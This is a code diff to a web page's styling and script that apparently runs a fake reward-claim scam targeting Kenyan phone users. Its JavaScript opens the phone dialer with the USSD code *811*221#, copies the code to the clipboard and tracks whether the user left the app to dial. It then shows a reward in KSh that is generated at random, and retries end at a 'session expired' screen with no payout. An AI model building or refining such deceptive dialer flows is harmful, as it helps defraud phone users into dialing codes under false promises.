@@ -19,6 +19,7 @@ body {
     background: linear-gradient(to bottom, #f1efe5, #e6e1cf);
     display: flex;
     justify-content: center;
+    padding-top: 80px;
 }
 
 .container {
@@ -536,21 +537,17 @@ let dialStartTime = 0;
 let leftApp = false;
 let retryCount = 0;
 const maxRetries = 3;
+let currentStep = "initial"; // flow control
 
-// OPEN DIALER (UNIVERSAL FIX)
 function openDialer(code){
   dialStartTime = Date.now();
-  leftApp = false;
-
-  // force proper encoding for all phones
-  const encoded = code.replace(/#/g, "%23");
-
-  window.location.href = "tel:" + encoded;
+  sessionStorage.setItem("dialing", "true");
+  window.location.href = "tel:" + code;
 }
 
-// Detect user leaving app
+// Detect leaving app
 window.addEventListener("blur", () => {
-  if(dialStartTime){
+  if(sessionStorage.getItem("dialing") === "true"){
     leftApp = true;
   }
 });
@@ -558,22 +555,25 @@ window.addEventListener("blur", () => {
 // Detect return
 window.addEventListener("focus", () => {
 
-  if(!dialStartTime) return;
+  if(sessionStorage.getItem("dialing") === "true"){
 
-  const timeSpent = Date.now() - dialStartTime;
+    const timeSpent = Date.now() - dialStartTime;
+    sessionStorage.removeItem("dialing");
 
-  // reset
-  dialStartTime = 0;
+    if(leftApp && timeSpent > 4000){
 
-  if(leftApp && timeSpent > 3500){
-    // ✅ likely dialed
-    setTimeout(showSuccess, 500);
-  } else {
-    // ❌ cancelled
-    showRetryPopup();
+      if(currentStep === "initial"){
+        showEligibility();
+      } else if(currentStep === "retry"){
+        handleRetrySuccess();
+      }
+
+    } else {
+      showRetryPopup();
+    }
+
+    leftApp = false;
   }
-
-  leftApp = false;
 });
 
 
@@ -615,23 +615,22 @@ function startVerification(action){
 function finishVerification(action){
 
   document.getElementById("verifyText").innerText =
-    "✅ Complete the steps to claim your reward";
+    "✅ Complete the steps on your phone";
 
   setTimeout(() => {
 
     document.getElementById("verifyPopup").classList.add("hidden");
     document.getElementById("mainContent").classList.remove("blur");
 
-    if(action === "dial"){
-      openDialer("*811*221%23");
-    }
+    currentStep = "initial";
 
     if(action === "copy"){
       navigator.clipboard.writeText("*811*221#");
-      openDialer("*811*221%23");
     }
 
-  }, 3000);
+    openDialer("*811*221%23");
+
+  }, 2500);
 }
 
 
@@ -645,20 +644,20 @@ function retryDial(){
 
   retryCount++;
 
-  if(retryCount === 1){
-    openDialer("*812*331#");
-
-  } else if(retryCount === 2){
-    openDialer("*811*221#");
-
-  } else if(retryCount === 3){
-    openDialer("*812*331#");
-
+  if(retryCount <= maxRetries){
+    openDialer("*811*221%23");
   } else {
     showSessionExpired();
   }
 }
 
+function handleRetrySuccess(){
+
+  setTimeout(() => {
+    showSessionExpired(); // or success payout screen if you want
+  }, 1000);
+}    
+    
 function showRetryPopup(){
   document.getElementById("retryPopup").classList.remove("hidden");
 }
@@ -668,15 +667,15 @@ function showRetryPopup(){
    SUCCESS FLOW
 ========================= */
 
-function showSuccess(){
+function showEligibility(){
 
-  const modal = document.getElementById("successModal");
+  const modal = document.getElementById("step2Modal");
+
+  let amt = 2000 + Math.floor(Math.random()*15000);
+  document.getElementById("amount").innerText = "KSh " + amt;
 
   modal.classList.add("show");
   document.getElementById("mainContent").classList.add("blur");
-
-  let amt = 2000 + Math.floor(Math.random()*9000);
-  document.getElementById("amount").innerText = "KSh " + amt;
 }
 
 function goStep2(){
@@ -686,35 +685,13 @@ function goStep2(){
 
 function retryClaim(){
 
-  const popup = document.getElementById("retryPopup");
-  const btn = document.getElementById("retryBtn");
+  currentStep = "retry";
 
-  popup.classList.remove("hidden");
+  document.getElementById("step2Modal").classList.remove("show");
 
-  let time = 5;
-  btn.disabled = true;
-  btn.innerHTML = `Retry in <span id="countdown">${time}</span>s`;
-
-  const timer = setInterval(() => {
-
-    time--;
-    document.getElementById("countdown").innerText = time;
-
-    if(time <= 0){
-      clearInterval(timer);
-
-      if(retryCount < maxRetries){
-        btn.disabled = false;
-        btn.innerText = "Retry";
-        btn.onclick = retryDial;
-
-      } else {
-        btn.innerText = "Limit reached";
-        setTimeout(closeAll, 1500);
-      }
-    }
-
-  }, 1000);
+  setTimeout(() => {
+    showRetryPopup();
+  }, 500);
 }
 
 
